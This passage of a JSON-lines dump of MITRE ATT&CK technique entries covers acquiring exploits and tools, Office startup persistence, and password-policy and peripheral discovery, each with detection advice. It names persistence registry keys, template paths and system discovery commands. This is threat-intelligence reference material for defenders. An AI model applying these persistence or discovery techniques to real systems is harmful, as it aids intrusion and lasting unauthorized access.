Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).","platforms":"PRE","data sources":"Certificate: Certificate Registration, Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1588","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky LuminousMoth July 2021),(Citation: Phish Labs Silent Librarian),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: ESET PLEAD Malware July 2018),(Citation: McAfee Honeybee),(Citation: CISA AppleJeus Feb 2021),"}
{"ID":"T1588.005","name":"Obtain Capabilities: Exploits","description":"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","url":"https://attack.mitre.org/techniques/T1588/005","created":"01 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Resource Development","detection":"\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1588","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: KISA Operation Muzabi),"}
{"ID":"T1588.001","name":"Obtain Capabilities: Malware","description":"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).","url":"https://attack.mitre.org/techniques/T1588/001","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.","platforms":"PRE","data sources":"Malware Repository: Malware Content, Malware Repository: Malware Metadata","is sub-technique":true,"sub-technique of":"T1588","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Kaspersky LuminousMoth July 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Mandiant APT1),(Citation: Bitdefender LuminousMoth July 2021),(Citation: NCC Group TA505),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: NSA NCSC Turla OilRig),(Citation: Recorded Future Turla Infra 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: McAfee Night Dragon),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1588.002","name":"Obtain Capabilities: Tool","description":"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).","url":"https://attack.mitre.org/techniques/T1588/002","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.","platforms":"PRE","data sources":"Malware Repository: Malware Metadata","is sub-technique":true,"sub-technique of":"T1588","defenses bypassed":null,"contributors":"Mnemonic AS; SOCCRATES","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft Prestige ransomware October 2022),(Citation: Mandiant APT1),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Tick Apr 2016),(Citation: Costa AvosLocker May 2022),(Citation: Symantec Leafminer July 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Kaspersky Carbanak),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: SecureWorks August 2019),(Citation: Unit42 Emissary Panda May 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Unit 42 DarkHydrus July 2018),(Citation: NCSC Joint Report Public Tools),(Citation: SecureList Silence Nov 2017),(Citation: BitDefender Chafer May 2020),(Citation: McAfee Night Dragon),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Microsoft POLONIUM June 2022),(Citation: Securelist APT Trends Q2 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Mandiant No Easy Breach),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye TRITON 2019),(Citation: Group IB Silence Aug 2019),(Citation: Check Point Rocket Kitten),(Citation: Symantec Elfin Mar 2019),(Citation: Proofpoint TA407 September 2019),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Anomali Static Kitten February 2021),(Citation: FireEye FIN10 June 2017),(Citation: ClearSky and Trend Micro Operation Wilted Tulip July 2017),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: FireEye APT35 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Volexity Patchwork June 2018),(Citation: NCC Group APT15 Alive and Strong),(Citation: Bizeul 2014),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: NCC Group TA505),(Citation: Dell TG-3390),(Citation: FireEye FIN6 Apr 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Microsoft Unidentified Dec 2018),(Citation: Symantec Whitefly March 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Phosphorus November 2021),(Citation: ESET Lazarus KillDisk April 2018),(Citation: FireEye APT19),(Citation: SentinelLabs Metador Sept 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: Cisco Talos Avos Jun 2022),(Citation: NCC Group Chimera January 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Palo Alto Sofacy 06-2018),(Citation: Symantec Thrip June 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT32 May 2017),(Citation: FireEye APT33 Guardrail),(Citation: Symantec Waterbug Jun 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Symantec Palmerworm Sep 2020),(Citation: Mandiant APT41),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Frankenstein June 2019),(Citation: IBM ITG07 June 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: FireEye APT29 Nov 2018),(Citation: F-Secure The Dukes),(Citation: Securelist Sofacy Feb 2018),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cylance Cleaver),(Citation: Cycraft Chimera April 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),"}
{"ID":"T1588.006","name":"Obtain Capabilities: Vulnerabilities","description":"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).","url":"https://attack.mitre.org/techniques/T1588/006","created":"15 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1588","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),"}
{"ID":"T1137","name":"Office Application Startup","description":"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)","url":"https://attack.mitre.org/techniques/T1137","created":"14 December 2017","last modified":"15 October 2021","version":"1.3","tactics":"Persistence","detection":"Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.\n\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)\n\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)","platforms":"Office 365, Windows","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Loic Jaquemet; Microsoft Threat Intelligence Center (MSTIC); Nick Carr, Mandiant; Praetorian; Ricardo Dias; Sahar Shukrun","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybereason Oceanlotus May 2017),(Citation: ESET Gamaredon June 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: SensePost Outlook Home Page),(Citation: SensePost Outlook Forms),(Citation: Palo Alto Office Test Sofacy),(Citation: win10_asr),(Citation: MRWLabs Office Persistence Add-ins)"}
{"ID":"T1137.006","name":"Office Application Startup: Add-ins","description":"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ","url":"https://attack.mitre.org/techniques/T1137/006","created":"07 November 2019","last modified":"16 August 2021","version":"1.1","tactics":"Persistence","detection":"Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior","platforms":"Office 365, Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1137","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CheckPoint Naikon May 2020),(Citation: Talos Bisonal Mar 2020),(Citation: win10_asr)"}
{"ID":"T1137.001","name":"Office Application Startup: Office Template Macros","description":"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.","url":"https://attack.mitre.org/techniques/T1137/001","created":"07 November 2019","last modified":"16 August 2021","version":"1.1","tactics":"Persistence","detection":"Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)","platforms":"Office 365, Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1137","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos Cobalt Strike September 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: win10_asr),(Citation: MRWLabs Office Persistence Add-ins)"}
{"ID":"T1137.002","name":"Office Application Startup: Office Test","description":"Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.","url":"https://attack.mitre.org/techniques/T1137/002","created":"07 November 2019","last modified":"16 August 2021","version":"1.1","tactics":"Persistence","detection":"Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)\n\nConsider monitoring Office processes for anomalous DLL loads.","platforms":"Office 365, Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1137","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":"Office 2007, 2010, 2013, and 2016","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Office Test Sofacy),(Citation: Palo Alto Office Test Sofacy),(Citation: win10_asr)"}
{"ID":"T1137.003","name":"Office Application Startup: Outlook Forms","description":"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)","url":"https://attack.mitre.org/techniques/T1137/003","created":"07 November 2019","last modified":"16 August 2021","version":"1.1","tactics":"Persistence","detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":"Office 365, Windows","data sources":"Application Log: Application Log Content, Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1137","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SensePost Ruler GitHub),(Citation: SensePost Outlook Home Page),(Citation: win10_asr),(Citation: SensePost Outlook Forms)"}
{"ID":"T1137.004","name":"Office Application Startup: Outlook Home Page","description":"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)\n","url":"https://attack.mitre.org/techniques/T1137/004","created":"07 November 2019","last modified":"16 August 2021","version":"1.1","tactics":"Persistence","detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":"Office 365, Windows","data sources":"Application Log: Application Log Content, Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1137","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SensePost Ruler GitHub),(Citation: FireEye Outlook Dec 2019),(Citation: SensePost Outlook Home Page),(Citation: win10_asr),(Citation: SensePost Outlook Forms)"}
{"ID":"T1137.005","name":"Office Application Startup: Outlook Rules","description":"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)\n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)","url":"https://attack.mitre.org/techniques/T1137/005","created":"07 November 2019","last modified":"15 October 2021","version":"1.1","tactics":"Persistence","detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) This PowerShell script is ineffective in gathering rules with modified `PRPR_RULE_MSG_NAME` and `PR_RULE_MSG_PROVIDER` properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":"Office 365, Windows","data sources":"Application Log: Application Log Content, Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1137","defenses bypassed":null,"contributors":"Microsoft Security","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SensePost Ruler GitHub),(Citation: SensePost Outlook Home Page),(Citation: win10_asr),(Citation: SensePost Outlook Forms)"}
{"ID":"T1201","name":"Password Policy Discovery","description":"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).","url":"https://attack.mitre.org/techniques/T1201","created":"18 April 2018","last modified":"06 September 2022","version":"1.5","tactics":"Discovery","detection":"Monitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.","platforms":"IaaS, Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, User Account: User Account Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Isif Ibrahima, Mandiant; Regina Elwell; Sudhanshu Chauhan, @Sudhanshu_C","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybereason OperationCuckooBees May 2022),(Citation: CrowdStrike BloodHound April 2018),(Citation: NCC Group Chimera January 2021),(Citation: GitHub PoshC2),(Citation: FireEye Targeted Attacks Middle East Banks),(Citation: Symantec Orangeworm April 2018),(Citation: ESET ComRAT May 2020),(Citation: CME Github September 2018),(Citation: Savill 1999),(Citation: Microsoft Install Password Filter n.d)"}
{"ID":"T1120","name":"Peripheral Device Discovery","description":"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.","url":"https://attack.mitre.org/techniques/T1120","created":"31 May 2017","last modified":"30 March 2023","version":"1.3","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: EFF Manul Aug 2016),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cisco Talos Intelligence Group),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: FoxIT Wocao December 2019),(Citation: Check Point APT34 April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: TrendMicro Patchwork Dec 